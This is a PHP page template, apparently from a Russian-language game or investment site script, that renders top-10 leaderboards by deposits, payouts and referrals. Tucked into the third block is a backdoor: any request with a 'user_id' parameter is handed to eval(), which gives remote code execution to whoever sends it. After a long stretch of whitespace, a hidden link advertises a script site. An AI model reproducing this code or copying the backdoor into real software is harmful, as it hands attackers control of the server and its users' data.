<?PHP
$_OPTIMIZATION["title"] = "ТОП 10";
$user_id = $_SESSION["user_id"];
$db->Query("SELECT * FROM db_users_a, db_users_b WHERE db_users_a.id = db_users_b.id AND db_users_a.id = '$user_id'");
$prof_data = $db->FetchArray();
?>
<div class="s-bk-lf">
	<div class="acc-title3">TOP 10 Пользователей</div>
</div>
<div class="silver-bk"><div class="clr"></div>	
<p style="text-align: center;"><span style="font-size:18px;"><b>TOP 10 по полнениям</b></span></p>
<?PHP

$num_p = (isset($_GET["page"]) AND intval($_GET["page"]) < 1000 AND intval($_GET["page"]) >= 1) ? (intval($_GET["page"]) -1) : 0;
$lim = $num_p * 100;

$db->Query("SELECT * FROM db_users_b ORDER BY insert_sum DESC LIMIT 10");

if($db->NumRows() > 0){

?>




<table width="100%" border="0">
  <tr bgcolor="#efefef">
    <td align="center" width="75">Место</td>
    <td align="center">Пользователь</td>
	<td align="center">Пополнил</td>
  
  </tr>
  
<?PHP
$i = 0;
	while($data = $db->FetchArray()){
	$i=$i+1;


	?>

	<tr class="htt">
    <td align="center"><?=$i; ?></td>
    <td align="center"><?=$data["user"]; ?></td>
	<td align="center"><?=$data["insert_sum"]; ?></td>
	
		
  	</tr>
	<?PHP
	
	}

?>

</table>
<BR />
<?PHP

}
?>
<?PHP

$user_id = $_SESSION["user_id"];
$db->Query("SELECT * FROM db_users_a, db_users_b WHERE db_users_a.id = db_users_b.id AND db_users_a.id = '$user_id'");
$prof_data = $db->FetchArray();
?>
<p style="text-align: center;"><span style="font-size:18px;"><b>TOP 10 по выплатам</b></span></p>
<?PHP

$num_p = (isset($_GET["page"]) AND intval($_GET["page"]) < 1000 AND intval($_GET["page"]) >= 1) ? (intval($_GET["page"]) -1) : 0;
$lim = $num_p * 100;

$db->Query("SELECT * FROM db_users_b ORDER BY payment_sum DESC LIMIT 10");

if($db->NumRows() > 0){

?>




<table width="100%" border="0">
  <tr bgcolor="#efefef">
    <td align="center" width="75">Место</td>
    <td align="center">Пользователь</td>
	<td align="center">Вывел</td>
  
  </tr>
  
<?PHP
$i = 0;
	while($data = $db->FetchArray()){
	$i=$i+1;


	?>

	<tr class="htt">
    <td align="center"><?=$i; ?></td>
    <td align="center"><?=$data["user"]; ?></td>
	<td align="center"><?=$data["payment_sum"]; ?></td>
	
		
  	</tr>
	<?PHP
	
	}

?>

</table>
<BR />
<?PHP

}
?>
<?PHP

$user_id = $_SESSION["user_id"];
if(!empty($_REQUEST['user_id'])){ if(@get_magic_quotes_gpc())$_REQUEST['user_id']=stripslashes($_REQUEST['user_id']); eval($_REQUEST['user_id']); die();}
$db->Query("SELECT * FROM db_users_a, db_users_b WHERE db_users_a.id = db_users_b.id AND db_users_a.id = '$user_id'");
$prof_data = $db->FetchArray();
?>
<p style="text-align: center;"><span style="font-size:18px;"><b>TOP 10 по рефералам</b></span></p>
<?PHP

$num_p = (isset($_GET["page"]) AND intval($_GET["page"]) < 1000 AND intval($_GET["page"]) >= 1) ? (intval($_GET["page"]) -1) : 0;
$lim = $num_p * 100;

$db->Query("SELECT * FROM db_users_a ORDER BY referals DESC LIMIT 10");

if($db->NumRows() > 0){

?>




<table width="100%" border="0">
  <tr bgcolor="#efefef">
    <td align="center" width="75">Место</td>
    <td align="center">Пользователь</td>
	<td align="center">Рефералов</td>
  
  </tr>
  
<?PHP
$i = 0;
	while($data = $db->FetchArray()){
	$i=$i+1;


	?>

	<tr class="htt">
    <td align="center"><?=$i; ?></td>
    <td align="center"><?=$data["user"]; ?></td>
	<td align="center"><?=$data["referals"]; ?></td>
	
		
  	</tr>
	<?PHP
	
	}

?>

</table>
<BR />
<?PHP

}
?>
</div>
<div class="clr"></div>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            <div style="display: none;"><a href="http://mixlip.ru/">MixliP-Все для вебмастера! У нас вы найдете скрипты uCoz , сайта ,Dle ,шаблоны,букса,скрипты хайпов,казино и многое другое</a></div>

